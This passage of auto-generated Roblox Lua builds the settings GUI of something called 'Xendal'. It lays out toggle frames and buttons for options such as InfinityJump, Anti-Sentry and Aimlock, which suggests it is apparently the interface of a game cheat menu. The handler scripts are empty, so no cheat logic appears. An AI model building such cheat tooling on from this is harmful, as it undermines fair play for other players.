G2L["142"]["BackgroundColor3"] = Color3.fromRGB(61, 61, 61);
G2L["142"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["142"]["Size"] = UDim2.new(0.5, 0, 0.5, 0);
G2L["142"]["Position"] = UDim2.new(0.5, 0, 0.5, 0);
G2L["142"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["142"]["Name"] = [[Mini]];
G2L["142"]["BackgroundTransparency"] = 1;


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.JumptBoostToggle.Holder.Circle.Mini.UICorner
G2L["143"] = Instance.new("UICorner", G2L["142"]);
G2L["143"]["CornerRadius"] = UDim.new(0, 100);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.JumptBoostToggle.Holder.Circle.UICorner
G2L["144"] = Instance.new("UICorner", G2L["141"]);
G2L["144"]["CornerRadius"] = UDim.new(1, 0);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.JumptBoostToggle.Holder.Button
G2L["145"] = Instance.new("TextButton", G2L["140"]);
G2L["145"]["BorderSizePixel"] = 0;
G2L["145"]["TextSize"] = 14;
G2L["145"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["145"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["145"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["145"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["145"]["BackgroundTransparency"] = 1;
G2L["145"]["Size"] = UDim2.new(1.1, 0, 1.25, 0);
G2L["145"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["145"]["Text"] = [[]];
G2L["145"]["Name"] = [[Button]];
G2L["145"]["Position"] = UDim2.new(0.5, 0, 0.5, 0);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.JumptBoostToggle.Holder.Button.LocalScript
G2L["146"] = Instance.new("LocalScript", G2L["145"]);



-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.JumptBoostToggle.Holder.UIPadding
G2L["147"] = Instance.new("UIPadding", G2L["140"]);
G2L["147"]["PaddingTop"] = UDim.new(0, 4);
G2L["147"]["PaddingRight"] = UDim.new(0, 4);
G2L["147"]["PaddingLeft"] = UDim.new(0, 4);
G2L["147"]["PaddingBottom"] = UDim.new(0, 4);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.JumptBoostToggle.Holder.UICorner
G2L["148"] = Instance.new("UICorner", G2L["140"]);
G2L["148"]["CornerRadius"] = UDim.new(0, 100);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.NoAnimationsToggle
G2L["149"] = Instance.new("Frame", G2L["101"]);
G2L["149"]["BorderSizePixel"] = 0;
G2L["149"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["149"]["Size"] = UDim2.new(0, 78, 0, 75);
G2L["149"]["Position"] = UDim2.new(0.73515, 0, 0.63366, 0);
G2L["149"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["149"]["Name"] = [[NoAnimationsToggle]];
G2L["149"]["BackgroundTransparency"] = 1;


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.NoAnimationsToggle.Main Handler
G2L["14a"] = Instance.new("LocalScript", G2L["149"]);
G2L["14a"]["Name"] = [[Main Handler]];


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.NoAnimationsToggle.Holder
G2L["14b"] = Instance.new("Frame", G2L["149"]);
G2L["14b"]["ZIndex"] = 2;
G2L["14b"]["BorderSizePixel"] = 0;
G2L["14b"]["BackgroundColor3"] = Color3.fromRGB(61, 61, 61);
G2L["14b"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["14b"]["Size"] = UDim2.new(0.589, 0, 0.31, 0);
G2L["14b"]["Position"] = UDim2.new(0.459, 0, -2.57333, -2);
G2L["14b"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["14b"]["Name"] = [[Holder]];


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.NoAnimationsToggle.Holder.Circle
G2L["14c"] = Instance.new("Frame", G2L["14b"]);
G2L["14c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["14c"]["AnchorPoint"] = Vector2.new(0, 0.5);
G2L["14c"]["Size"] = UDim2.new(0.43831, 0, 1, 1);
G2L["14c"]["Position"] = UDim2.new(-0.00422, 0, 0.5, 0);
G2L["14c"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["14c"]["Name"] = [[Circle]];


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.NoAnimationsToggle.Holder.Circle.Mini
G2L["14d"] = Instance.new("Frame", G2L["14c"]);
G2L["14d"]["BackgroundColor3"] = Color3.fromRGB(61, 61, 61);
G2L["14d"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["14d"]["Size"] = UDim2.new(0.5, 0, 0.5, 0);
G2L["14d"]["Position"] = UDim2.new(0.5, 0, 0.5, 0);
G2L["14d"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["14d"]["Name"] = [[Mini]];
G2L["14d"]["BackgroundTransparency"] = 1;


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.NoAnimationsToggle.Holder.Circle.Mini.UICorner
G2L["14e"] = Instance.new("UICorner", G2L["14d"]);
G2L["14e"]["CornerRadius"] = UDim.new(0, 100);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.NoAnimationsToggle.Holder.Circle.UICorner
G2L["14f"] = Instance.new("UICorner", G2L["14c"]);
G2L["14f"]["CornerRadius"] = UDim.new(1, 0);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.NoAnimationsToggle.Holder.Button
G2L["150"] = Instance.new("TextButton", G2L["14b"]);
G2L["150"]["BorderSizePixel"] = 0;
G2L["150"]["TextSize"] = 14;
G2L["150"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["150"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["150"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["150"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["150"]["BackgroundTransparency"] = 1;
G2L["150"]["Size"] = UDim2.new(1.1, 0, 1.25, 0);
G2L["150"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["150"]["Text"] = [[]];
G2L["150"]["Name"] = [[Button]];
G2L["150"]["Position"] = UDim2.new(0.5, 0, 0.5, 0);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.NoAnimationsToggle.Holder.Button.LocalScript
G2L["151"] = Instance.new("LocalScript", G2L["150"]);



-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.NoAnimationsToggle.Holder.UIPadding
G2L["152"] = Instance.new("UIPadding", G2L["14b"]);
G2L["152"]["PaddingTop"] = UDim.new(0, 4);
G2L["152"]["PaddingRight"] = UDim.new(0, 4);
G2L["152"]["PaddingLeft"] = UDim.new(0, 4);
G2L["152"]["PaddingBottom"] = UDim.new(0, 4);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.NoAnimationsToggle.Holder.UICorner
G2L["153"] = Instance.new("UICorner", G2L["14b"]);
G2L["153"]["CornerRadius"] = UDim.new(0, 100);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.JumpSpinToggle
G2L["154"] = Instance.new("Frame", G2L["101"]);
G2L["154"]["BorderSizePixel"] = 0;
G2L["154"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["154"]["Size"] = UDim2.new(0, 78, 0, 75);
G2L["154"]["Position"] = UDim2.new(0.73515, 0, 0.63366, 0);
G2L["154"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["154"]["Name"] = [[JumpSpinToggle]];
G2L["154"]["BackgroundTransparency"] = 1;


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.JumpSpinToggle.Main Handler
G2L["155"] = Instance.new("LocalScript", G2L["154"]);
G2L["155"]["Name"] = [[Main Handler]];


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.JumpSpinToggle.Holder
G2L["156"] = Instance.new("Frame", G2L["154"]);
G2L["156"]["ZIndex"] = 2;
G2L["156"]["BorderSizePixel"] = 0;
G2L["156"]["BackgroundColor3"] = Color3.fromRGB(61, 61, 61);
G2L["156"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["156"]["Size"] = UDim2.new(0.589, 0, 0.31, 0);
G2L["156"]["Position"] = UDim2.new(0.459, 0, -1.36, -2);
G2L["156"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["156"]["Name"] = [[Holder]];


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.JumpSpinToggle.Holder.Circle
G2L["157"] = Instance.new("Frame", G2L["156"]);
G2L["157"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["157"]["AnchorPoint"] = Vector2.new(0, 0.5);
G2L["157"]["Size"] = UDim2.new(0.43831, 0, 1, 1);
G2L["157"]["Position"] = UDim2.new(-0.00422, 0, 0.5, 0);
G2L["157"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["157"]["Name"] = [[Circle]];


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.JumpSpinToggle.Holder.Circle.Mini
G2L["158"] = Instance.new("Frame", G2L["157"]);
G2L["158"]["BackgroundColor3"] = Color3.fromRGB(61, 61, 61);
G2L["158"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["158"]["Size"] = UDim2.new(0.5, 0, 0.5, 0);
G2L["158"]["Position"] = UDim2.new(0.5, 0, 0.5, 0);
G2L["158"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["158"]["Name"] = [[Mini]];
G2L["158"]["BackgroundTransparency"] = 1;


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.JumpSpinToggle.Holder.Circle.Mini.UICorner
G2L["159"] = Instance.new("UICorner", G2L["158"]);
G2L["159"]["CornerRadius"] = UDim.new(0, 100);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.JumpSpinToggle.Holder.Circle.UICorner
G2L["15a"] = Instance.new("UICorner", G2L["157"]);
G2L["15a"]["CornerRadius"] = UDim.new(1, 0);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.JumpSpinToggle.Holder.Button
G2L["15b"] = Instance.new("TextButton", G2L["156"]);
G2L["15b"]["BorderSizePixel"] = 0;
G2L["15b"]["TextSize"] = 14;
G2L["15b"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["15b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["15b"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["15b"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["15b"]["BackgroundTransparency"] = 1;
G2L["15b"]["Size"] = UDim2.new(1.1, 0, 1.25, 0);
G2L["15b"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["15b"]["Text"] = [[]];
G2L["15b"]["Name"] = [[Button]];
G2L["15b"]["Position"] = UDim2.new(0.5, 0, 0.5, 0);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.JumpSpinToggle.Holder.Button.LocalScript
G2L["15c"] = Instance.new("LocalScript", G2L["15b"]);



-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.JumpSpinToggle.Holder.UIPadding
G2L["15d"] = Instance.new("UIPadding", G2L["156"]);
G2L["15d"]["PaddingTop"] = UDim.new(0, 4);
G2L["15d"]["PaddingRight"] = UDim.new(0, 4);
G2L["15d"]["PaddingLeft"] = UDim.new(0, 4);
G2L["15d"]["PaddingBottom"] = UDim.new(0, 4);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.JumpSpinToggle.Holder.UICorner
G2L["15e"] = Instance.new("UICorner", G2L["156"]);
G2L["15e"]["CornerRadius"] = UDim.new(0, 100);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.InfinityJumpToggle
G2L["15f"] = Instance.new("Frame", G2L["101"]);
G2L["15f"]["BorderSizePixel"] = 0;
G2L["15f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["15f"]["Size"] = UDim2.new(0, 78, 0, 75);
G2L["15f"]["Position"] = UDim2.new(0.73515, 0, 0.63366, 0);
G2L["15f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["15f"]["Name"] = [[InfinityJumpToggle]];
G2L["15f"]["BackgroundTransparency"] = 1;


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.InfinityJumpToggle.Main Handler
G2L["160"] = Instance.new("LocalScript", G2L["15f"]);
G2L["160"]["Name"] = [[Main Handler]];


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.InfinityJumpToggle.Holder
G2L["161"] = Instance.new("Frame", G2L["15f"]);
G2L["161"]["ZIndex"] = 2;
G2L["161"]["BorderSizePixel"] = 0;
G2L["161"]["BackgroundColor3"] = Color3.fromRGB(61, 61, 61);
G2L["161"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["161"]["Size"] = UDim2.new(0.589, 0, 0.31, 0);
G2L["161"]["Position"] = UDim2.new(0.459, 0, -3.2, -2);
G2L["161"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["161"]["Name"] = [[Holder]];


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.InfinityJumpToggle.Holder.Circle
G2L["162"] = Instance.new("Frame", G2L["161"]);
G2L["162"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["162"]["AnchorPoint"] = Vector2.new(0, 0.5);
G2L["162"]["Size"] = UDim2.new(0.43831, 0, 1, 1);
G2L["162"]["Position"] = UDim2.new(-0.00422, 0, 0.5, 0);
G2L["162"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["162"]["Name"] = [[Circle]];


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.InfinityJumpToggle.Holder.Circle.Mini
G2L["163"] = Instance.new("Frame", G2L["162"]);
G2L["163"]["BackgroundColor3"] = Color3.fromRGB(61, 61, 61);
G2L["163"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["163"]["Size"] = UDim2.new(0.5, 0, 0.5, 0);
G2L["163"]["Position"] = UDim2.new(0.5, 0, 0.5, 0);
G2L["163"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["163"]["Name"] = [[Mini]];
G2L["163"]["BackgroundTransparency"] = 1;


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.InfinityJumpToggle.Holder.Circle.Mini.UICorner
G2L["164"] = Instance.new("UICorner", G2L["163"]);
G2L["164"]["CornerRadius"] = UDim.new(0, 100);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.InfinityJumpToggle.Holder.Circle.UICorner
G2L["165"] = Instance.new("UICorner", G2L["162"]);
G2L["165"]["CornerRadius"] = UDim.new(1, 0);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.InfinityJumpToggle.Holder.Button
G2L["166"] = Instance.new("TextButton", G2L["161"]);
G2L["166"]["BorderSizePixel"] = 0;
G2L["166"]["TextSize"] = 14;
G2L["166"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["166"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["166"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["166"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["166"]["BackgroundTransparency"] = 1;
G2L["166"]["Size"] = UDim2.new(1.1, 0, 1.25, 0);
G2L["166"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["166"]["Text"] = [[]];
G2L["166"]["Name"] = [[Button]];
G2L["166"]["Position"] = UDim2.new(0.5, 0, 0.5, 0);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.InfinityJumpToggle.Holder.Button.LocalScript
G2L["167"] = Instance.new("LocalScript", G2L["166"]);



-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.InfinityJumpToggle.Holder.UIPadding
G2L["168"] = Instance.new("UIPadding", G2L["161"]);
G2L["168"]["PaddingTop"] = UDim.new(0, 4);
G2L["168"]["PaddingRight"] = UDim.new(0, 4);
G2L["168"]["PaddingLeft"] = UDim.new(0, 4);
G2L["168"]["PaddingBottom"] = UDim.new(0, 4);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.InfinityJumpToggle.Holder.UICorner
G2L["169"] = Instance.new("UICorner", G2L["161"]);
G2L["169"]["CornerRadius"] = UDim.new(0, 100);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.NoflymeduseToggle
G2L["16a"] = Instance.new("Frame", G2L["101"]);
G2L["16a"]["BorderSizePixel"] = 0;
G2L["16a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["16a"]["Size"] = UDim2.new(0, 78, 0, 75);
G2L["16a"]["Position"] = UDim2.new(0.73515, 0, 0.63366, 0);
G2L["16a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["16a"]["Name"] = [[NoflymeduseToggle]];
G2L["16a"]["BackgroundTransparency"] = 1;


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.NoflymeduseToggle.Main Handler
G2L["16b"] = Instance.new("LocalScript", G2L["16a"]);
G2L["16b"]["Name"] = [[Main Handler]];


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.NoflymeduseToggle.Holder
G2L["16c"] = Instance.new("Frame", G2L["16a"]);
G2L["16c"]["ZIndex"] = 2;
G2L["16c"]["BorderSizePixel"] = 0;
G2L["16c"]["BackgroundColor3"] = Color3.fromRGB(61, 61, 61);
G2L["16c"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["16c"]["Size"] = UDim2.new(0.589, 0, 0.31, 0);
G2L["16c"]["Position"] = UDim2.new(0.459, 0, -1.96, -2);
G2L["16c"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["16c"]["Name"] = [[Holder]];


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.NoflymeduseToggle.Holder.Circle
G2L["16d"] = Instance.new("Frame", G2L["16c"]);
G2L["16d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["16d"]["AnchorPoint"] = Vector2.new(0, 0.5);
G2L["16d"]["Size"] = UDim2.new(0.43831, 0, 1, 1);
G2L["16d"]["Position"] = UDim2.new(-0.00422, 0, 0.5, 0);
G2L["16d"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["16d"]["Name"] = [[Circle]];


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.NoflymeduseToggle.Holder.Circle.Mini
G2L["16e"] = Instance.new("Frame", G2L["16d"]);
G2L["16e"]["BackgroundColor3"] = Color3.fromRGB(61, 61, 61);
G2L["16e"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["16e"]["Size"] = UDim2.new(0.5, 0, 0.5, 0);
G2L["16e"]["Position"] = UDim2.new(0.5, 0, 0.5, 0);
G2L["16e"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["16e"]["Name"] = [[Mini]];
G2L["16e"]["BackgroundTransparency"] = 1;


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.NoflymeduseToggle.Holder.Circle.Mini.UICorner
G2L["16f"] = Instance.new("UICorner", G2L["16e"]);
G2L["16f"]["CornerRadius"] = UDim.new(0, 100);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.NoflymeduseToggle.Holder.Circle.UICorner
G2L["170"] = Instance.new("UICorner", G2L["16d"]);
G2L["170"]["CornerRadius"] = UDim.new(1, 0);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.NoflymeduseToggle.Holder.Button
G2L["171"] = Instance.new("TextButton", G2L["16c"]);
G2L["171"]["BorderSizePixel"] = 0;
G2L["171"]["TextSize"] = 14;
G2L["171"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["171"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["171"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["171"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["171"]["BackgroundTransparency"] = 1;
G2L["171"]["Size"] = UDim2.new(1.1, 0, 1.25, 0);
G2L["171"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["171"]["Text"] = [[]];
G2L["171"]["Name"] = [[Button]];
G2L["171"]["Position"] = UDim2.new(0.5, 0, 0.5, 0);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.NoflymeduseToggle.Holder.Button.LocalScript
G2L["172"] = Instance.new("LocalScript", G2L["171"]);



-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.NoflymeduseToggle.Holder.UIPadding
G2L["173"] = Instance.new("UIPadding", G2L["16c"]);
G2L["173"]["PaddingTop"] = UDim.new(0, 4);
G2L["173"]["PaddingRight"] = UDim.new(0, 4);
G2L["173"]["PaddingLeft"] = UDim.new(0, 4);
G2L["173"]["PaddingBottom"] = UDim.new(0, 4);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.NoflymeduseToggle.Holder.UICorner
G2L["174"] = Instance.new("UICorner", G2L["16c"]);
G2L["174"]["CornerRadius"] = UDim.new(0, 100);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.Anti-SentryToggle
G2L["175"] = Instance.new("Frame", G2L["101"]);
G2L["175"]["BorderSizePixel"] = 0;
G2L["175"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["175"]["Size"] = UDim2.new(0, 78, 0, 75);
G2L["175"]["Position"] = UDim2.new(0.73515, 0, 0.63366, 0);
G2L["175"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["175"]["Name"] = [[Anti-SentryToggle]];
G2L["175"]["BackgroundTransparency"] = 1;


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.Anti-SentryToggle.Main Handler
G2L["176"] = Instance.new("LocalScript", G2L["175"]);
G2L["176"]["Name"] = [[Main Handler]];


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.Anti-SentryToggle.Holder
G2L["177"] = Instance.new("Frame", G2L["175"]);
G2L["177"]["ZIndex"] = 2;
G2L["177"]["BorderSizePixel"] = 0;
G2L["177"]["BackgroundColor3"] = Color3.fromRGB(61, 61, 61);
G2L["177"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["177"]["Size"] = UDim2.new(0.589, 0, 0.31, 0);
G2L["177"]["Position"] = UDim2.new(0.459, 0, -0.74667, -2);
G2L["177"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["177"]["Name"] = [[Holder]];


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.Anti-SentryToggle.Holder.Circle
G2L["178"] = Instance.new("Frame", G2L["177"]);
G2L["178"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["178"]["AnchorPoint"] = Vector2.new(0, 0.5);
G2L["178"]["Size"] = UDim2.new(0.43831, 0, 1, 1);
G2L["178"]["Position"] = UDim2.new(-0.00422, 0, 0.5, 0);
G2L["178"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["178"]["Name"] = [[Circle]];


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.Anti-SentryToggle.Holder.Circle.Mini
G2L["179"] = Instance.new("Frame", G2L["178"]);
G2L["179"]["BackgroundColor3"] = Color3.fromRGB(61, 61, 61);
G2L["179"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["179"]["Size"] = UDim2.new(0.5, 0, 0.5, 0);
G2L["179"]["Position"] = UDim2.new(0.5, 0, 0.5, 0);
G2L["179"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["179"]["Name"] = [[Mini]];
G2L["179"]["BackgroundTransparency"] = 1;


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.Anti-SentryToggle.Holder.Circle.Mini.UICorner
G2L["17a"] = Instance.new("UICorner", G2L["179"]);
G2L["17a"]["CornerRadius"] = UDim.new(0, 100);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.Anti-SentryToggle.Holder.Circle.UICorner
G2L["17b"] = Instance.new("UICorner", G2L["178"]);
G2L["17b"]["CornerRadius"] = UDim.new(1, 0);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.Anti-SentryToggle.Holder.Button
G2L["17c"] = Instance.new("TextButton", G2L["177"]);
G2L["17c"]["BorderSizePixel"] = 0;
G2L["17c"]["TextSize"] = 14;
G2L["17c"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["17c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["17c"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["17c"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["17c"]["BackgroundTransparency"] = 1;
G2L["17c"]["Size"] = UDim2.new(1.1, 0, 1.25, 0);
G2L["17c"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["17c"]["Text"] = [[]];
G2L["17c"]["Name"] = [[Button]];
G2L["17c"]["Position"] = UDim2.new(0.5, 0, 0.5, 0);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.Anti-SentryToggle.Holder.Button.LocalScript
G2L["17d"] = Instance.new("LocalScript", G2L["17c"]);



-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.Anti-SentryToggle.Holder.UIPadding
G2L["17e"] = Instance.new("UIPadding", G2L["177"]);
G2L["17e"]["PaddingTop"] = UDim.new(0, 4);
G2L["17e"]["PaddingRight"] = UDim.new(0, 4);
G2L["17e"]["PaddingLeft"] = UDim.new(0, 4);
G2L["17e"]["PaddingBottom"] = UDim.new(0, 4);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.Anti-SentryToggle.Holder.UICorner
G2L["17f"] = Instance.new("UICorner", G2L["177"]);
G2L["17f"]["CornerRadius"] = UDim.new(0, 100);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.AimlockToggle
G2L["180"] = Instance.new("Frame", G2L["101"]);
G2L["180"]["BorderSizePixel"] = 0;
G2L["180"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["180"]["Size"] = UDim2.new(0, 78, 0, 75);
G2L["180"]["Position"] = UDim2.new(0.73515, 0, 0.63366, 0);
G2L["180"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["180"]["Name"] = [[AimlockToggle]];
G2L["180"]["BackgroundTransparency"] = 1;


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.AimlockToggle.Main Handler
G2L["181"] = Instance.new("LocalScript", G2L["180"]);
G2L["181"]["Name"] = [[Main Handler]];


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.AimlockToggle.Holder
G2L["182"] = Instance.new("Frame", G2L["180"]);
G2L["182"]["ZIndex"] = 2;
G2L["182"]["BorderSizePixel"] = 0;
G2L["182"]["BackgroundColor3"] = Color3.fromRGB(61, 61, 61);
G2L["182"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["182"]["Size"] = UDim2.new(0.589, 0, 0.31, 0);
G2L["182"]["Position"] = UDim2.new(0.459, 0, -0.14667, -2);
G2L["182"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["182"]["Name"] = [[Holder]];


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Movement.ScrollingFrame.AimlockToggle.Holder.Circle
G2L["183"] = Instance.new("Frame", G2L["182"]);
G2L["183"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["183"]["AnchorPoint"] = Vector2.new(0, 0.5);
G2L["183"]["Size"] = UDim2.new(0.43831, 0, 1, 1);
